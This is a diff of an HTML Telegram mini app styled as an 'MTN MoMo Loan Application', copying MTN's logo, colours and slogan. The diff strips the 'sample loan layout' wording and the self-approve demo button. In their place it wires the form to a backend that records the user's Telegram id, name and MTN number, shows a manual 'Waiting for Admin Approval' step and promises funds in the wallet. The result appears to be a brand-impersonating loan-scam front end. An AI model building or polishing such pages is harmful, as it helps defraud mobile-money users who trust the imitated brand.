@@ -1,4 +1,4 @@
-<!-- ==================== FILE 3 PART 1 OF 3: LAYOUT HTML ==================== -->
+<!-- ==================== PART 1 OF 3: public/index.html (HTML & CSS Layouts) ==================== -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,249 +7,65 @@
     <title>MTN MoMo Loan Application Mini App</title>
     <script src="https://telegram.org"></script>
     <style>
-        /* CSS STYLING OVERVIEW */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-        }
-
-        body {
-            background-color: #0b1c3a;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .app-window {
-            width: 100%;
-            max-width: 420px;
-            min-height: 100vh;
-            background: linear-gradient(180deg, #002d62 0%, #001736 100%);
-            position: relative;
-            overflow-x: hidden;
-            display: flex;
-            flex-direction: column;
-            padding-bottom: 40px;
-        }
-
-        .screen {
-            display: none;
-            flex-direction: column;
-            width: 100%;
-            height: 100%;
-        }
-
-        .screen.active {
-            display: flex;
-        }
-
-        .demo-banner {
-            background-color: #ffcc00;
-            color: #000;
-            text-align: center;
-            font-size: 11px;
-            font-weight: bold;
-            padding: 4px 10px;
-            width: fit-content;
-            margin: 10px auto;
-            border-radius: 20px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            z-index: 10;
-        }
-
-        .branding-header {
-            display: flex;
-            align-items: center;
-            padding: 15px 20px;
-            gap: 12px;
-        }
-
-        .momo-box-logo {
-            background-color: #ffcc00;
-            color: #032b5e;
-            padding: 6px 12px;
-            border-radius: 12px;
-            font-weight: 900;
-            font-size: 18px;
-            line-height: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .momo-box-sub {
-            font-size: 7px;
-            font-weight: bold;
-            text-transform: uppercase;
-            margin-top: 1px;
-        }
-
-        .header-title-text {
-            font-weight: bold;
-            font-size: 16px;
-            line-height: 1.2;
-        }
-
-        .header-title-sub {
-            color: #ffcc00;
-            font-size: 13px;
-        }
-
-        .bottom-yellow-wave {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 120%;
-            height: 110px;
-            background: #ffcc00;
-            border-top-left-radius: 40% 60px;
-            border-top-right-radius: 60% 40px;
-            transform: translateX(-5%);
-            z-index: 1;
-        }
-
-        .landing-hero {
-            padding: 15px 20px;
-            text-align: left;
-            position: relative;
-        }
-
-        .mtn-circle-badge {
-            background: #ffcc00;
-            color: #032b5e;
-            width: 76px;
-            height: 76px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: 900;
-            font-size: 20px;
-            border: 2px solid #fff;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            margin-left: auto;
-            margin-right: 15px;
-        }
-
-        .main-promo-heading {
-            font-size: 32px;
-            font-weight: 800;
-            margin-top: 10px;
-            line-height: 1.1;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        body { background-color: #0b1c3a; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .app-window { width: 100%; max-width: 420px; min-height: 100vh; background: linear-gradient(180deg, #002d62 0%, #001736 100%); position: relative; overflow-x: hidden; display: flex; flex-direction: column; padding-bottom: 40px; }
+        .screen { display: none; flex-direction: column; width: 100%; height: 100%; }
+        .screen.active { display: flex; }
+        .demo-banner { background-color: #ffcc00; color: #000; text-align: center; font-size: 11px; font-weight: bold; padding: 4px 10px; width: fit-content; margin: 10px auto; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.5px; z-index: 10; }
+        .branding-header { display: flex; align-items: center; padding: 15px 20px; gap: 12px; }
+        .momo-box-logo { background-color: #ffcc00; color: #032b5e; padding: 6px 12px; border-radius: 12px; font-weight: 900; font-size: 18px; line-height: 1; display: flex; flex-direction: column; align-items: center; }
+        .momo-box-sub { font-size: 7px; font-weight: bold; text-transform: uppercase; margin-top: 1px; }
+        .header-title-text { font-weight: bold; font-size: 16px; line-height: 1.2; }
+        .header-title-sub { color: #ffcc00; font-size: 13px; }
+        .bottom-yellow-wave { position: absolute; bottom: 0; left: 0; width: 120%; height: 110px; background: #ffcc00; border-top-left-radius: 40% 60px; border-top-right-radius: 60% 40px; transform: translateX(-5%); z-index: 1; }
+        .landing-hero { padding: 15px 20px; text-align: left; position: relative; }
+        .mtn-circle-badge { background: #ffcc00; color: #032b5e; width: 76px; height: 76px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: 900; font-size: 20px; border: 2px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin-left: auto; margin-right: 15px; }
+        .main-promo-heading { font-size: 32px; font-weight: 800; margin-top: 10px; line-height: 1.1; }
         .main-promo-heading span { color: #ffcc00; }
-
-        .promo-subtext {
-            font-size: 15px;
-            color: #cbdcf0;
-            margin-top: 12px;
-            line-height: 1.4;
-            max-width: 90%;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 25px 20px;
-        }
-
-        .feature-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-
-        .feature-icon-circle {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            border: 2px solid #ffcc00;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 22px;
-            margin-bottom: 8px;
-            color: #ffcc00;
-        }
-
+        .promo-subtext { font-size: 15px; color: #cbdcf0; margin-top: 12px; line-height: 1.4; max-width: 90%; }
+        .features-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 25px 20px; }
+        .feature-item { display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .feature-icon-circle { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #ffcc00; display: flex; justify-content: center; align-items: center; font-size: 22px; margin-bottom: 8px; color: #ffcc00; }
         .feature-text { font-size: 13px; font-weight: bold; }
-
-        .highlights-card {
-            background: #ffffff;
-            color: #032b5e;
-            margin: 10px 20px;
-            border-radius: 16px;
-            padding: 16px;
-            z-index: 2;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.25);
-        }
-
-        .card-section-title {
-            font-size: 16px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #e1e8ed;
-            padding-bottom: 8px;
-        }
-
-        .highlight-row {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-        }
-
-        .hl-box {
-            background: #f4f7fa;
-            padding: 10px;
-            border-radius: 8px;
-            border-left: 3.5px solid #ffcc00;
-        }
-
+        .highlights-card { background: #ffffff; color: #032b5e; margin: 10px 20px; border-radius: 16px; padding: 16px; z-index: 2; box-shadow: 0 5px 15px rgba(0,0,0,0.25); }
+        .card-section-title { font-size: 16px; font-weight: bold; display: flex; align-items: center; gap: 6px; margin-bottom: 15px; border-bottom: 1px solid #e1e8ed; padding-bottom: 8px; }
+        .highlight-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        .hl-box { background: #f4f7fa; padding: 10px; border-radius: 8px; border-left: 3.5px solid #ffcc00; }
         .hl-label { font-size: 11px; color: #627d98; font-weight: bold; text-transform: uppercase; }
         .hl-value { font-size: 14px; font-weight: bold; margin-top: 2px; }
-
-        .footer-banner-text {
-            text-align: center;
-            font-size: 13px;
-            font-weight: bold;
-            color: #032b5e;
-            position: absolute;
-            bottom: 20px;
-            width: 100%;
-            left: 0;
-            z-index: 2;
-        }
-
-        .pill-cta-btn {
-            background-color: #ffcc00;
-            color: #032b5e;
-            border: none;
-            padding: 14px 30px;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            width: fit-content;
-            margin: 15px auto;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            z-index: 5;
-            position: relative;
-        }
+        .footer-banner-text { text-align: center; font-size: 13px; font-weight: bold; color: #032b5e; position: absolute; bottom: 20px; width: 100%; left: 0; z-index: 2; }
+        .pill-cta-btn { background-color: #ffcc00; color: #032b5e; border: none; padding: 14px 30px; border-radius: 30px; font-size: 17px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; width: fit-content; margin: 15px auto; box-shadow: 0 4px 12px rgba(0,0,0,0.3); z-index: 5; position: relative; }
+        .form-scaffold { background: #ffffff; color: #032b5e; border-radius: 20px; margin: 15px 16px; padding: 20px 16px; z-index: 2; box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 14px; font-weight: bold; margin-bottom: 6px; }
+        .input-wrapper input, .input-wrapper select { width: 100%; padding: 12px 14px; border: 1.5px solid #cbdcf0; border-radius: 10px; font-size: 15px; color: #032b5e; outline: none; background-color: #ffffff; }
+        .whatsapp-support-bar { background-color: #075e54; color: white; margin: 15px 16px; padding: 12px; border-radius: 12px; display: flex; align-items: center; gap: 12px; font-size: 13px; z-index: 2; }
+        .wa-icon { font-size: 24px; }
+        .wa-details h4 { font-size: 14px; font-weight: bold; }
+        .wa-details p { font-size: 11px; opacity: 0.8; }
+        .spinner-viewport { display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 24px; text-align: center; z-index: 2; flex-grow: 1; }
+        .spinner-viewport.active { display: flex; }
+        .outer-ring-glowing { width: 110px; height: 110px; border-radius: 50%; background-color: #00315c; border: 3px solid #00a4e4; display: flex; justify-content: center; align-items: center; margin-bottom: 25px; box-shadow: 0 0 20px rgba(0, 164, 228, 0.5); }
+        .hourglass-svg { font-size: 42px; color: #ffcc00; }
+        .spinner-heading { font-size: 28px; font-weight: bold; margin-bottom: 12px; }
+        .spinner-heading span { color: #ffcc00; }
+        .alert-spinner-ribbon { background-color: #ffcc00; color: #001736; width: 100%; padding: 14px 20px; border-radius: 30px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 15px; margin-bottom: 25px; }
+        .css-loop-circle { width: 18px; height: 18px; border: 3px solid #001736; border-right-color: transparent; border-radius: 50%; margin-right: 12px; animation: rotateFrames 1s linear infinite; }
+        @keyframes rotateFrames { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-card { background: #ffffff; color: #032b5e; border-radius: 20px; margin: 15px 16px; padding: 24px 16px; z-index: 2; box-shadow: 0 6px 20px rgba(0,0,0,0.3); text-align: center; }
+        .success-checkmark-circle { width: 70px; height: 70px; background-color: #28a745; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 36px; margin: 0 auto 15px auto; }
+        .success-title { font-size: 24px; font-weight: 800; color: #28a745; margin-bottom: 6px; }
+        .success-msg { font-size: 14px; color: #627d98; margin-bottom: 20px; }
+        .receipt-table { width: 100%; margin-bottom: 20px; }
+        .receipt-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px dashed #e1e8ed; font-size: 14px; }
+        .receipt-label { color: #627d98; font-weight: 500; }
+        .receipt-val { font-weight: bold; }
+        .receipt-status-badge { padding: 2px 10px; border-radius: 12px; font-weight: bold; font-size: 12px; }
+        .badge-approved { background-color: #e2f6e7; color: #28a745; }
+        .badge-declined { background-color: #fce8e6; color: #dc3545; }
+        .info-notice-banner { background-color: #e6f0fa; color: #002d62; padding: 12px; border-radius: 10px; font-size: 13px; margin-bottom: 15px; }
+        .secure-footer-stamp { display: flex; align-items: center; justify-content: center; font-size: 12px; color: #cbdcf0; margin: 15px auto; z-index: 2; }
     </style>
 </head>
 <body>
@@ -259,133 +75,41 @@
         <!-- SCREEN 1: LANDING OVERVIEW -->
         <div id="screen-landing" class="screen active">
             <div class="branding-header">
-                <div class="momo-box-logo">
-                    <span>MoMo</span>
-                    <span class="momo-box-sub">from mtn</span>
-                </div>
+                <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
                 <div>
                     <div class="header-title-text">MTN MoMo</div>
                     <div class="header-title-sub">Fast. Safe. Reliable.</div>
                 </div>
             </div>
-
             <div class="landing-hero">
                 <div class="mtn-circle-badge">MTN</div>
                 <h1 class="main-promo-heading">Welcome to<br><span>MTN MoMo</span><br>Loan Application</h1>
-                <p class="promo-subtext">Get quick micro-loans seamlessly, securely and instantly deposited straight into your mobile money wallet.</p>
+                <p class="promo-subtext">Get quick micro-loans deposited straight into your mobile money wallet.</p>
             </div>
-
             <div class="features-grid">
-                <div class="feature-item">
-                    <div class="feature-icon-circle">⚡</div>
-                    <div class="feature-text">Fast Approval</div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon-circle">🛡️</div>
-                    <div class="feature-text">Secure & Reliable</div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon-circle">📱</div>
-                    <div class="feature-text">Apply Anywhere</div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon-circle">🤝</div>
-                    <div class="feature-text">Flexible Repayment</div>
-                </div>
+                <div class="feature-item"><div class="feature-icon-circle">⚡</div><div class="feature-text">Fast Approval</div></div>
+                <div class="feature-item"><div class="feature-icon-circle">🛡️</div><div class="feature-text">Secure & Safe</div></div>
             </div>
-
-            <div class="highlights-card">
-                <div class="card-section-title">👑 Loan Highlights</div>
-                <div class="highlight-row">
-                    <div class="hl-box">
-                        <div class="hl-label">Max Limit</div>
-                        <div class="hl-value">UGX 5,000,000</div>
-                    </div>
-                    <div class="hl-box">
-                        <div class="hl-label">Duration</div>
-                        <div class="hl-value">4 - 60 Months</div>
-                    </div>
-                </div>
-            </div>
-
             <button class="pill-cta-btn" onclick="navigateTo('screen-form')">Apply Now ➔</button>
-
             <div class="bottom-yellow-wave"></div>
-            <div class="footer-banner-text">Your financial goals are within reach with MTN MoMo!</div>
         </div>
 <!-- CONTINUED IN PART 2... -->
-<!-- ==================== FILE 3 PART 2 OF 3: FORM & SPINNER INTERFACE ==================== -->
+<!-- ==================== PART 2 OF 3: public/index.html (Forms, Spinner UI & Embedded Core Scripts) ==================== -->
         <!-- SCREEN 2: APPLICATION FORM INPUTS -->
         <div id="screen-form" class="screen">
-            <style>
-                .form-scaffold {
-                    background: #ffffff;
-                    color: #032b5e;
-                    border-radius: 20px;
-                    margin: 15px 16px;
-                    padding: 20px 16px;
-                    z-index: 2;
-                    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-                }
-
-                .input-group { margin-bottom: 16px; }
-                .input-group label { display: block; font-size: 14px; font-weight: bold; margin-bottom: 6px; }
-
-                .input-wrapper input, .input-wrapper select {
-                    width: 100%;
-                    padding: 12px 14px;
-                    border: 1.5px solid #cbdcf0;
-                    border-radius: 10px;
-                    font-size: 15px;
-                    color: #032b5e;
-                    outline: none;
-                    background-color: #ffffff;
-                }
-
-                .whatsapp-support-bar {
-                    background-color: #075e54;
-                    color: white;
-                    margin: 15px 16px;
-                    padding: 12px;
-                    border-radius: 12px;
-                    display: flex;
-                    align-items: center;
-                    gap: 12px;
-                    font-size: 13px;
-                    z-index: 2;
-                }
-
-                .wa-icon { font-size: 24px; }
-                .wa-details h4 { font-size: 14px; font-weight: bold; }
-                .wa-details p { font-size: 11px; opacity: 0.8; }
-            </style>
-
             <div class="branding-header">
-                <div class="momo-box-logo">
-                    <span>MoMo</span>
-                    <span class="momo-box-sub">from mtn</span>
-                </div>
-                <div>
-                    <div class="header-title-text">Loan Application</div>
-                    <div class="header-title-sub">Explore a sample loan layout</div>
-                </div>
+                <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
+                <div><div class="header-title-text">Loan Application</div><div class="header-title-sub">Secure form interface</div></div>
             </div>
-
             <div class="form-scaffold">
                 <div class="input-group">
                     <label>👤 Full Name</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="input-name" placeholder="Enter your full name">
-                    </div>
+                    <div class="input-wrapper"><input type="text" id="input-name" placeholder="Enter your full name"></div>
                 </div>
-
                 <div class="input-group">
                     <label>📱 MTN Number</label>
-                    <div class="input-wrapper">
-                        <input type="tel" id="input-phone" placeholder="07XXXXXXXX" maxlength="10">
-                    </div>
+                    <div class="input-wrapper"><input type="tel" id="input-phone" placeholder="07XXXXXXXX" maxlength="10"></div>
                 </div>
-
                 <div class="input-group">
                     <label>💰 Loan Amount (UGX)</label>
                     <div class="input-wrapper">
@@ -393,12 +117,9 @@
                             <option value="" disabled selected>Select amount</option>
                             <option value="UGX 500,000">UGX 500,000</option>
                             <option value="UGX 1,000,000">UGX 1,000,000</option>
-                            <option value="UGX 2,500,000">UGX 2,500,000</option>
-                            <option value="UGX 5,000,000">UGX 5,000,000</option>
                         </select>
                     </div>
                 </div>
-
                 <div class="input-group">
                     <label>📅 Repayment Period</label>
                     <div class="input-wrapper">
@@ -406,237 +127,61 @@
                             <option value="" disabled selected>Select period</option>
                             <option value="6 Months">6 Months</option>
                             <option value="12 Months">12 Months</option>
-                            <option value="24 Months">24 Months</option>
                         </select>
                     </div>
                 </div>
-
                 <button class="pill-cta-btn" style="width:100%; margin-top:10px;" onclick="submitApplicationForm()">Continue ➔</button>
             </div>
-
-            <div class="secure-footer-stamp">🛡️ | Your information is secure with MTN</div>
-
             <div class="whatsapp-support-bar">
                 <div class="wa-icon">💬</div>
-                <div class="wa-details">
-                    <h4>WhatsApp Customer Support</h4>
-                    <p>Chat with us for assistance: +256 700 123 456</p>
-                </div>
+                <div class="wa-details"><h4>WhatsApp Support</h4><p>Chat with us: +256 700 123 456</p></div>
             </div>
         </div>
 
-        <!-- SCREEN 3: WAITING FOR ADMIN SPINNER -->
+        <!-- SCREEN 3: WAITING FOR ADMIN LOOP SPINNER -->
         <div id="screen-spinner" class="spinner-viewport">
-            <style>
-                .spinner-viewport {
-                    display: none;
-                    flex-direction: column;
-                    align-items: center;
-                    justify-content: center;
-                    padding: 40px 24px;
-                    text-align: center;
-                    z-index: 2;
-                    flex-grow: 1;
-                }
-                .spinner-viewport.active { display: flex; }
-
-                .outer-ring-glowing {
-                    width: 110px;
-                    height: 110px;
-                    border-radius: 50%;
-                    background-color: #00315c;
-                    border: 3px solid #00a4e4;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    margin-bottom: 25px;
-                    box-shadow: 0 0 20px rgba(0, 164, 228, 0.5);
-                }
-
-                .hourglass-svg { font-size: 42px; color: #ffcc00; }
-                .spinner-heading { font-size: 28px; font-weight: bold; margin-bottom: 12px; }
-                .spinner-heading span { color: #ffcc00; }
-                .spinner-sub { font-size: 14px; color: #cbdcf0; margin-bottom: 30px; }
-
-                .alert-spinner-ribbon {
-                    background-color: #ffcc00;
-                    color: #001736;
-                    width: 100%;
-                    padding: 14px 20px;
-                    border-radius: 30px;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    font-weight: bold;
-                    font-size: 15px;
-                    margin-bottom: 25px;
-                }
-
-                .css-loop-circle {
-                    width: 18px;
-                    height: 18px;
-                    border: 3px solid #001736;
-                    border-right-color: transparent;
-                    border-radius: 50%;
-                    margin-right: 12px;
-                    animation: rotateFrames 1s linear infinite;
-                }
-
-                @keyframes rotateFrames {
-                    0% { transform: rotate(0deg); }
-                    100% { transform: rotate(360deg); }
-                }
-
-                .inline-action-row { width: 100%; max-width: 340px; margin-top: 20px; }
-                .approve-trigger-btn {
-                    background-color: #28a745;
-                    color: white;
-                    border: none;
-                    width: 100%;
-                    padding: 14px;
-                    border-radius: 25px;
-                    font-size: 16px;
-                    font-weight: bold;
-                    cursor: pointer;
-                    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-                }
-            </style>
-
-            <div class="outer-ring-glowing">
-                <div class="hourglass-svg">⌛</div>
-            </div>
-
+            <div class="outer-ring-glowing"><div class="hourglass-svg">⌛</div></div>
             <h1 class="spinner-heading">Waiting for Admin<br><span>Approval</span></h1>
-            <p class="spinner-sub">Your request is being reviewed by our admin team. Please wait...</p>
-
-            <div class="alert-spinner-ribbon">
-                <div class="css-loop-circle"></div>
-                <span>Admin is reviewing your request...</span>
-            </div>
-
-            <p class="spinner-sub" style="font-size:13px;">You will be notified once your request is approved.</p>
-
-            <div class="inline-action-row">
-                <button class="approve-trigger-btn" onclick="approveApplicationAction()">Approve Request</button>
-            </div>
+            <div class="alert-spinner-ribbon"><div class="css-loop-circle"></div><span>Admin is reviewing your request...</span></div>
+            <p class="spinner-sub" style="font-size:13px; color: #cbdcf0;">You will be redirected automatically once approved or declined by our team inside Telegram.</p>
         </div>
-<!-- CONTINUED IN PART 3... -->
-<!-- ==================== FILE 3 PART 3 OF 3: SUCCESS PANEL & SCRIPTS ==================== -->
-        <!-- SCREEN 4: SUCCESS SUMMARY RECEIPT -->
+
+        <!-- SCREEN 4: DISBURSEMENT RESULTS SUMMARY RECEIPT -->
         <div id="screen-success" class="screen">
-            <style>
-                .success-card {
-                    background: #ffffff;
-                    color: #032b5e;
-                    border-radius: 20px;
-                    margin: 15px 16px;
-                    padding: 24px 16px;
-                    z-index: 2;
-                    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-                    text-align: center;
-                }
-
-                .success-checkmark-circle {
-                    width: 70px;
-                    height: 70px;
-                    background-color: #28a745;
-                    color: white;
-                    border-radius: 50%;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    font-size: 36px;
-                    margin: 0 auto 15px auto;
-                }
-
-                .success-title { font-size: 24px; font-weight: 800; color: #28a745; margin-bottom: 6px; }
-                .success-msg { font-size: 14px; color: #627d98; margin-bottom: 20px; }
-                .receipt-table { width: 100%; margin-bottom: 20px; }
-
-                .receipt-row {
-                    display: flex;
-                    justify-content: space-between;
-                    padding: 10px 0;
-                    border-bottom: 1px dashed #e1e8ed;
-                    font-size: 14px;
-                }
-
-                .receipt-label { color: #627d98; font-weight: 500; }
-                .receipt-val { font-weight: bold; }
-                .receipt-status-badge { background-color: #e2f6e7; color: #28a745; padding: 2px 10px; border-radius: 12px; }
-                .info-notice-banner { background-color: #e6f0fa; color: #002d62; padding: 12px; border-radius: 10px; font-size: 13px; margin-bottom: 15px; }
-                .secure-footer-stamp { display: flex; align-items: center; justify-content: center; font-size: 12px; color: #cbdcf0; margin: 15px auto; z-index: 2; }
-            </style>
-
             <div class="branding-header">
-                <div class="momo-box-logo">
-                    <span>MoMo</span>
-                    <span class="momo-box-sub">from mtn</span>
-                </div>
-                <div>
-                    <div class="header-title-text">MTN MoMo Loan</div>
-                    <div class="header-title-sub">Application successful</div>
-                </div>
+                <div class="momo-box-logo"><span>MoMo</span><span class="momo-box-sub">from mtn</span></div>
+                <div><div class="header-title-text">MTN MoMo Loan</div><div class="header-title-sub">Processed summary</div></div>
             </div>
-
             <div class="success-card">
-                <div class="success-checkmark-circle">✓</div>
-                <h2 class="success-title">Loan Application Successful!</h2>
-                <p class="success-msg">Your MTN MoMo loan application has been submitted and processed successfully.</p>
-
+                <div id="success-icon" class="success-checkmark-circle">✓</div>
+                <h2 id="success-headline" class="success-title">Status Updated</h2>
                 <div class="receipt-table">
-                    <div class="receipt-row">
-                        <span class="receipt-label">Loan Amount:</span>
-                        <span class="receipt-val" id="receipt-amount">UGX 1,000,000</span>
-                    </div>
-                    <div class="receipt-row">
-                        <span class="receipt-label">Repayment Period:</span>
-                        <span class="receipt-val" id="receipt-period">12 Months</span>
-                    </div>
-                    <div class="receipt-row">
-                        <span class="receipt-label">Mobile Number:</span>
-                        <span class="receipt-val" id="receipt-phone">07XXXXXXXX</span>
-                    </div>
-                    <div class="receipt-row">
-                        <span class="receipt-label">Application Status:</span>
-                        <span class="receipt-val"><span class="receipt-status-badge">Approved</span></span>
-                    </div>
+                    <div class="receipt-row"><span class="receipt-label">Loan Amount:</span><span class="receipt-val" id="receipt-amount">-</span></div>
+                    <div class="receipt-row"><span class="receipt-label">Repayment Period:</span><span class="receipt-val" id="receipt-period">-</span></div>
+                    <div class="receipt-row"><span class="receipt-label">Mobile Number:</span><span class="receipt-val" id="receipt-phone">-</span></div>
+                    <div class="receipt-row"><span class="receipt-label">Review Status:</span><span><span id="receipt-status-badge" class="receipt-status-badge">-</span></span></div>
                 </div>
-
-                <div class="info-notice-banner">
-                    ℹ️ You will receive the loan confirmation shortly via SMS from MTN.
-                </div>
-
-                <button class="pill-cta-btn" style="width:100%; background-color:#ffcc00;" onclick="resetWorkflowLoop()">➔ Log In With MTN Number</button>
+                <div id="info-notice" class="info-notice-banner">-</div>
+                <button class="pill-cta-btn" style="width:100%; background-color:#ffcc00;" onclick="resetWorkflowLoop()">➔ Exit to Dashboard</button>
             </div>
-
-            <div class="secure-footer-stamp">🛡️ | Your information is secure with MTN</div>
         </div>
     </div>
 
-    <!-- CORE FUNCTIONAL CONTROL SCRIPT -->
     <script>
+        let currentTrackingId = null, pollTimer = null, userChatId = null;
         if (window.Telegram && window.Telegram.WebApp) {
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
+            window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand();
+            if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+                userChatId = window.Telegram.WebApp.initDataUnsafe.user.id;
+            }
         }
-
-        let applicationState = {
-            name: '',
-            phone: '',
-            amount: '',
-            period: ''
-        };
+        let appDataState = { name: '', phone: '', amount: '', period: '', userChatId: userChatId };
 
         function navigateTo(screenId) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById('screen-spinner').classList.remove('active');
-
-            if (screenId === 'screen-spinner') {
-                document.getElementById('screen-spinner').classList.add('active');
-            } else {
-                document.getElementById(screenId).classList.add('active');
-            }
+            if (screenId === 'screen-spinner') document.getElementById('screen-spinner').classList.add('active');
+            else document.getElementById(screenId).classList.add('active');
         }
 
         function submitApplicationForm() {
@@ -644,54 +189,49 @@
             const phoneField = document.getElementById('input-phone').value.trim();
             const amountField = document.getElementById('input-amount').value;
             const periodField = document.getElementById('input-period').value;
+            if (!nameField || !phoneField || !amountField || !periodField) { alert('Please fulfill all fields.'); return; }
 
-            if (!nameField || !phoneField || !amountField || !periodField) {
-                alert('Please fulfill all criteria inputs before continuing.');
-                return;
-            }
-
-            applicationState.name = nameField;
-            applicationState.phone = phoneField;
-            applicationState.amount = amountField;
-            applicationState.period = periodField;
-
-            navigateTo('screen-spinner');
+            appDataState.name = nameField; appDataState.phone = phoneField; appDataState.amount = amountField; appDataState.period = periodField;
+            fetch('/api/loans/submit', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(appDataState)
+            })
+            .then(res => res.json()).then(data => {
+                if (data.success) { currentTrackingId = data.applicationId; navigateTo('screen-spinner'); startStatusCheckingLoop(); }
+                else alert("Error: " + data.error);
+            }).catch(err => console.error(err));
         }
 
-        function approveApplicationAction() {
-            document.getElementById('receipt-amount').innerText = applicationState.amount;
-            document.getElementById('receipt-period').innerText = applicationState.period;
-            document.getElementById('receipt-phone').innerText = applicationState.phone;
+        function startStatusCheckingLoop() {
+            if (pollTimer) clearInterval(pollTimer);
+            pollTimer = setInterval(() => {
+                if (!currentTrackingId) return;
+                fetch(`/api/loans/status/${currentTrackingId}`).then(res => res.json()).then(data => {
+                    if (data.success && (data.status === 'APPROVED' || data.status === 'DECLINED')) {
+                        clearInterval(pollTimer); renderFinalStateView(data.status);
+                    }
+                }).catch(err => console.log(err));
+            }, 2000);
+        }
 
+        function renderFinalStateView(finalStatus) {
+            document.getElementById('receipt-amount').innerText = appDataState.amount;
+            document.getElementById('receipt-period').innerText = appDataState.period;
+            document.getElementById('receipt-phone').innerText = appDataState.phone;
+            const badge = document.getElementById('receipt-status-badge'); badge.innerText = finalStatus;
+
+            if (finalStatus === 'APPROVED') {
+                document.getElementById('success-icon').style.backgroundColor = '#28a745'; document.getElementById('success-icon').innerText = '✓';
+                document.getElementById('success-headline').innerText = 'Application Approved!'; document.getElementById('success-headline').style.color = '#28a745';
+                document.getElementById('info-notice').innerText = 'ℹ️ Funds will land inside your mobile wallet shortly.'; badge.className = 'receipt-status-badge badge-approved';
+            } else {
+                document.getElementById('success-icon').style.backgroundColor = '#dc3545'; document.getElementById('success-icon').innerText = '✕';
+                document.getElementById('success-headline').innerText = 'Application Declined'; document.getElementById('success-headline').style.color = '#dc3545';
+                document.getElementById('info-notice').innerText = 'ℹ️ Review parameters criteria were not successfully met.'; badge.className = 'receipt-status-badge badge-declined';
+            }
             navigateTo('screen-success');
-
-            if (window.Telegram && window.Telegram.WebApp.showAlert) {
-                window.Telegram.WebApp.showAlert("Loan Application Approved and Distributed!");
-            }
         }
 
-        document.addEventListener("DOMContentLoaded", function() {
-            const inputs = document.querySelectorAll(".input-wrapper input, .input-wrapper select");
-            inputs.forEach(input => {
-                input.addEventListener("focus", () => {
-                    const wave = document.querySelector(".bottom-yellow-wave");
-                    if(wave) wave.style.display = "none";
-                });
-                input.addEventListener("blur", () => {
-                    const wave = document.querySelector(".bottom-yellow-wave");
-                    if(wave) wave.style.display = "block";
-                });
-            });
-        });
-
-        function resetWorkflowLoop() {
-            document.getElementById('input-name').value = '';
-            document.getElementById('input-phone').value = '';
-            document.getElementById('input-amount').selectedIndex = 0;
-            document.getElementById('input-period').selectedIndex = 0;
-
-            navigateTo('screen-landing');
-        }
+        function resetWorkflowLoop() { if (pollTimer) clearInterval(pollTimer); location.reload(); }
     </script>
 </body>
 </html>
